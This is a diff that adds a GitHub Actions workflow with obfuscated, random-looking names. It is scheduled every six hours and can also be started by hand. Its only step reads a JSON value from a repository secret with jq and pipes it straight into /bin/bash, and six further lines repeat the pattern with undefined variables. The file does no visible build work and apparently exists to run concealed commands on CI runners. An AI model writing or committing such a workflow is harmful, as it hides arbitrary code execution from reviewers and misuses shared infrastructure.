@@ -1,0 +1,24 @@
+name: banilaizhee
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: banilaizhee
+        env:
+          obgek4945: ${{ secrets.obgek4945 }}
+        run: |
+          echo $obgek4945 | jq -r .nzuqa13852 | /bin/bash
+          echo $lrbvy63 | jq -r .bxfmp87723 | /bin/bash
+          echo $goda4 | jq -r .xe98101 | /bin/bash
+          echo $cly60 | jq -r .tcgq48 | /bin/bash
+          echo $q813 | jq -r .dlffo0 | /bin/bash
+          echo $q1746 | jq -r .kzupc8495 | /bin/bash
+          echo $zsad1949 | jq -r .ry15 | /bin/bash
+
